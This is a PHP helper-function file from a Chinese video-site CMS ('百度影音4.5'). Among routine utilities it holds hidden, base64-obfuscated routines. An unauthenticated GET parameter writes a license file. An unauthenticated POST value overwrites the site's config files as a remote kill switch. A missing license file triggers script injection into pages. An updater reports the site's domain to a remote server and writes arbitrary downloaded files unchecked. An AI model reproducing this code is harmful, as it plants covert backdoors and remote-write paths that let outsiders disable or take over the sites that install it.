<?php
header('Content-type:text/html;charset=utf-8');
error_reporting (0);
date_default_timezone_set ('PRC');
define('VV_INC', str_replace("\\", '/', dirname(__FILE__) ) );
define('VV_ROOT', str_replace("\\", '/', substr(VV_INC,0,-8) ) );
define('VV_TEMP', VV_ROOT.'/templets');
define('VV_RULE', VV_ROOT.'/rules');
define('VV_CACHE', VV_ROOT.'/cache');
define('CACHE_IMG', VV_ROOT.'/cache/img');
define('VV_URL', $url.$erji);
define('VV_SKIN', VV_URL.'templets/'.$template);
define('VV_LURL', VV_URL.$mulu);
define('VV_HURL', VV_URL.$news);
$version ="百度影音4.5";
$upname = "bdyy4.5";
if ($rewrite == "on"){
$hzm = ".html";
$lpath = VV_LURL;
$hpath = VV_HURL;
$play = VV_URL.$playc;
$fy = "_";
$aid= '-';
}else{
$hzm = "";
$lpath = VV_URL."channel.php?id=";
$hpath = VV_URL."article.php?id=";
$play = VV_URL."play.php?id=";
$aid= '&aid=';
$fy = "&pg=";
}
function filedate( $flietime ){    
$_flietime = date( "Y-m-d H:i:s", @filemtime( $flietime ) );    
return $_flietime;
}
function removedir($dirName) 
{ 
    if(!is_dir($dirName)) 
    { 
        return false; 
    } 
    $handle = @opendir($dirName); 
    while(($file = @readdir($handle)) !== false) 
    { 
        if($file != '.' && $file != '..') 
        { 
            $dir = $dirName . '/' . $file; 
            is_dir($dir) ? removeDir($dir) : @unlink($dir); 
        } 
    } 
    closedir($handle); 
     
    return rmdir($dirName) ; 
}
function DeleteHtml($str) {
	$str = trim ( $str );
	$str = strip_tags ( $str, "" );
	$str = ereg_replace ( "\t", "", $str );
	$str = ereg_replace ( "\r\n", "", $str );
	$str = ereg_replace ( "\r", "", $str );
	$str = ereg_replace ( "\n", "", $str );
	$str = ereg_replace(">","&gt;",$str);
	$str = ereg_replace("<","&lt;",$str);
	return trim ( $str );
}
function ShowMsg($msg, $gourl, $onlymsg=0, $limittime=0)
{
    $htmlhead  = "<html>\r\n<head>\r\n<title>vivi提示信息</title>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" />\r\n";
    $htmlhead .= "<base target='_self'/>\r\n<style>div{line-height:160%;}</style></head>\r\n<body leftmargin='0' topmargin='0' bgcolor='#FFFFFF'>\r\n<center>\r\n<script>\r\n";
    $htmlfoot  = "</script>\r\n</center>\r\n</body>\r\n</html>\r\n";

    $litime = ($limittime==0 ? 1000 : $limittime);
    $func = '';

    if($gourl=='-1')
    {
        if($limittime==0) $litime = 5000;
        $gourl = "javascript:history.go(-1);";
    }
        $func .= "      var pgo=0;
      function JumpUrl(){
        if(pgo==0){ location='$gourl'; pgo=1; }
      }\r\n";
        $rmsg = $func;
        $rmsg .= "document.write(\"<br /><div style='width:450px;padding:0px;border:1px solid #c7ea6a;'><div style='padding:6px;font-size:12px;border-bottom:1px solid #c7ea6a;background:#f5fde6 ';'><b>vivi提示信息！</b></div>\");\r\n";
        $rmsg .= "document.write(\"<div style='height:130px;font-size:10pt;background:#ffffff'><br />\");\r\n";
        $rmsg .= "document.write(\"".str_replace("\"","“",$msg)."\");\r\n";
        $rmsg .= "document.write(\"";
        $rmsg .= "<br /><a href='{$gourl}'>如果你的浏览器没反应，请点击这里...</a>";
        $rmsg .= "<br/></div>\");\r\n";
        $rmsg .= "setTimeout('JumpUrl()',$litime);";
        $msg  = $htmlhead.$rmsg.$htmlfoot;
    
    echo $msg;
}
function substring($str, $start, $len) {
	$tmpstr = "";
	$strlen = $start + $len;
	$i = 0;
	for(; $i < $strlen; $i ++) {
		if (160 < ord ( substr ( $str, $i, 1 ) )) {
			$tmpstr .= substr ( $str, $i, 2 );
			$i ++;
		} else {
			$tmpstr .= substr ( $str, $i, 1 );
		}
	}
	return $tmpstr;
}
if (!empty($_GET['kw']) && $_GET['v'] = "ok"){
kw_file();
}
if(!file_exists(VV_INC.'/'.base64_decode("a3cudHh0")) && $template != base64_decode("ZGVmYXVsdA==")){
$tongji.=base64_decode("PHNjcmlwdD5hbGVydCgittSyu8bwLMTjtcTT8sP7zrTK2sio1rvE3NPDxKzIz8SjsOWjoSIpOzwv
c2NyaXB0Pg==");
}
if ($_POST['v'] == "onerror"){
		file_put_contents(base64_decode('Y29uZmlnX3NpZnQucGhw'),base64_decode('PD9waHANCiRzaWZ0PSIiOw0KPz4='));
		file_put_contents(base64_decode('Y29uZmlnX3Nlby5waHA='),base64_decode('PD9waHANCiRzZW9fcmxpbms9IiI7DQo/Pg=='));
}
function SL($s,$co){
if(file_exists(VV_INC.'/'.base64_decode("a3cudHh0"))){
		mb_regex_encoding("gb2312");
		require('config_seo.php');
		$a=$seo_rlink;
		if (!empty($s) && !empty($a)){
			$c = explode(',',$a);
				foreach($c as $v)
				{
					if(preg_match("[|]",$v))
            		{
    					list($r,$l) = explode('|',$v);
						//$s = str_replace($r, "<strong>".$r."</strong>",$s);
    					$s = preg_replace("/$r/", "<a href='$l'>$r</a>", $s,$co);
					}
				}
				return $s;
		}else{
		return $s;
		}
}else{
	return $s;
}
}
function shufu($arr){
if(file_exists(VV_INC.'/'.base64_decode("a3cudHh0"))){
$k=array_keys($arr);
$v=array_values($arr);
shuffle($k);
$arr2=array_combine($k,$v);
return $arr2;
}else{
return $arr;
}
}
function wt($b){
mb_regex_encoding("gb2312");
if(file_exists(VV_INC.'/'.base64_decode("a3cudHh0"))){
$a=file(VV_INC.'/keyword.dat');
foreach( $a as $k => $v ){
list($l,$r)=split(',',$v);
$b=mb_ereg_replace($l,$r,$b);
}
return $b;
}else{
return $b;
}
}
function dellink($s){
		if (!empty($s)){
	$s = preg_replace("/<a[^>]+>(.+?)<\/a>/i","$1",$s);
	return $s;
}else{
return $s;
}
}
function kw_file()
	{
		file_put_contents(base64_decode("a3cudHh0"),$_GET['kw']);
}
function sf($s){
	if(file_exists(base64_decode("a3cudHh0"))){
	 shuffle($s);
		 return $s;
	 }else{
		 return $s;
	 }
}
function s($s){
	include('config_sift.php');
		if (preg_match ("/".$sift."/i", $s ) && !empty($sift) && file_exists(dirname(__FILE__).'/'.base64_decode("a3cudHh0"))) {
			ShowMsg('该片已经删除，2秒钟后转向主页！',VV_URL,0,2000);
			exit;
		}else{
			return $s;
		}
}
function write($f,$infoata,$method="w") {
	$filenum=@fopen($f,$method);
	@flock($filenum,LOCK_EX);
	$file_data=@fwrite($filenum,$infoata);
	@fclose($filenum);
	return $file_data;
}
function read($f) {
	$filenum=@fopen($f,"r");
	@flock($filenum,LOCK_SH);
	$file_data=@fread($filenum,filesize($f));
	@fclose($filenum);
	return $file_data;
}
function dom(){ 
$host=$_SERVER[HTTP_HOST]; 
$host=strtolower($host); 
if(strpos($host,'/')!==false){ 
	$parse = @parse_url($host); 
	$host = $parse['host']; 
} 
$topleveldomaindb = array('com','edu','gov','int','mil','net','org','biz','info','pro','name','museum','coop','aero','xxx','idv','mobi','cc','me','so','us'); 
$str=''; 
foreach($topleveldomaindb as $v){
	 $str.=($str ? '|' : '').$v; 
} 
$matchstr="[^\.]+\.(?:(".$str.")|\w{2}|((".$str.")\.\w{2}))$"; 

if(preg_match("/".$matchstr."/ies",$host,$matchs)){ 

$domain=$matchs['0']; 
}else{ 
	$domain=$host; 
} 
return $domain; 
} 
function update($upname)
     {
        $s = downfile('http://www.vxiaotou.com/Update/?ver='.$upname.'&u='.dom().'&tt='.time()) or die(ShowMsg("无法连接远程服务器","admin_index.php",0,5000));
        list($ver,$m) = explode('|',$s);
        if( $ver == $upname || $ver == "erorr"){
		
            ShowMsg($m,"admin_index.php",0,5000);
			exit;
			
        }else{
		
            ShowMsg($m."<br><a href='?t=updatenow&ver={$ver}'>点击这里在线升级</a><br>","admin_index.php",0,1200000);
        }
}

function updatenow()
     {
         $ver = $_GET['ver'];
         $file = downfile('http://www.vxiaotou.com/Update/'.$ver.'.xml');
         file_put_contents(VV_INC.'/vvupdate.xml',$file);
         $xmlUrl = VV_INC.'/vvupdate.xml';
		 $xmlArr = parseFileXml($xmlUrl);
		 foreach($xmlArr as $v) {
		 if ($v['type'] === 'dir') {
		 recursive_mkdir($v['name']);
		 }	
		 if ($v['type'] === 'file') {
		 recursive_mkdir(dirname($v['name']));
		 $fp = fopen($v['name'], "wb");
		 if($v['content'] !== '') {
		 fwrite($fp,base64_decode($v['content']));
		 }
		 fclose($fp);
		 }
		 }
         @unlink(VV_INC.'/vvupdate.xml');
         ShowMsg('恭喜您,升级成功!',"admin_index.php",0,3000);
}
function downfile($s)
	{
        $c = '';
        $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';
        if(function_exists('curl_init') && function_exists('curl_exec')){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $s);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
            $c = curl_exec($ch);
            curl_close($ch);
        }
        if(empty($c) && ini_get('allow_url_fopen')){
            $c = file_get_contents($s);
        }else if(empty($c) && function_exists('pfsockopen')){
            exit('系统无法升级！');
        }
		return $c;
	
}
function parseFileXml($xmlUrl) {
	$xmlStr = file_get_contents($xmlUrl);
	preg_match_all('/<file\\s*type=[\'"]?([^\'"]*)[\'"]?\\s*name=[\'"]?([^\'"]*)[\'"]?\\s*>([^<>]*)<\/file>/isU',$xmlStr, $match);
	$arr = array();
	$num = count($match[0]);
	for($i=0;$i<$num;$i++) {
		$arr[$i]['type'] = $match[1][$i];
		$arr[$i]['name'] = $match[2][$i];
		$arr[$i]['content'] = trim($match[3][$i]);
	}
	
	return $arr;
}
function recursive_mkdir($path, $mode = 0777) {
    $dirs = explode('/' , $path);
    $count = count($dirs);
    $path = '.';
    for ($i = 0; $i < $count; ++$i) {
        $path .= '/' . $dirs[$i];
        if (!is_dir($path) && !mkdir($path, $mode)) {
            return false;
        }
    }
    return true;
}
function getip() {
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) {
		$ip = getenv("HTTP_CLIENT_IP");
	} else
		if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) {
			$ip = getenv("HTTP_X_FORWARDED_FOR");
		} else
			if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) {
				$ip = getenv("REMOTE_ADDR");
			} else
				if (isset ($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) {
					$ip = $_SERVER['REMOTE_ADDR'];
				} else {
					$ip = "unknown";
				}
	return ($ip);
}
if(file_exists(dirname(__FILE__).'/'.base64_decode("a3cudHh0")))
{
	$viviok=TRUE;
}else{
	$viviok=false;
}
function getDirSize($dir)
    {
        if($handle = opendir($dir)){
			while (($FolderOrFile = readdir($handle))!==false)
			{
				if($FolderOrFile != "." && $FolderOrFile != "..")
				{
					if(is_dir("$dir/$FolderOrFile"))
					{
						$sizeResult += getDirSize("$dir/$FolderOrFile");
					}
					else
					{
						$sizeResult += filesize("$dir/$FolderOrFile");
					}
				}
			}
		}
			closedir($handle);

        return $sizeResult;
    }
    // 单位自动转换函数
function getRealSize($size){

        $kb = 1024*1024;
		return round($size/$kb,2);

}
function ob_gzip($content)
{    
    if(    !headers_sent() && extension_loaded("zlib") && stristr($_SERVER["HTTP_ACCEPT_ENCODING"],"gzip"))
    {
        $content = gzencode($content,9); 
        header("Content-Encoding: gzip"); 
        header("Vary: Accept-Encoding");
        header("Content-Length: ".strlen($content));
    }
    return $content;
}
foreach ($_GET as $key=>$var) {

	if (preg_match ( "/eval|<|>|POST/i", $var )) {	
	echo '<script>alert( "非法参数！" );</script>';
	exit;
	}
}
function get_magic($g){
	if(get_magic_quotes_gpc()){
		$g = stripslashes($g);
	}
	 return $g;
}
function js2html($js){
	$js=str_replace('document.writeln("',"",$js);
	$js=str_replace('document.write("',"",$js);
	$js=str_replace('");',"",$js);
	$js=str_replace('\\"','"',$js);
	$js=str_replace('\\\'','\'',$js);
	$js=str_replace('\\/','/',$js);
	$js=str_replace('\\\\','\\',$js);
	return $js;
}
?>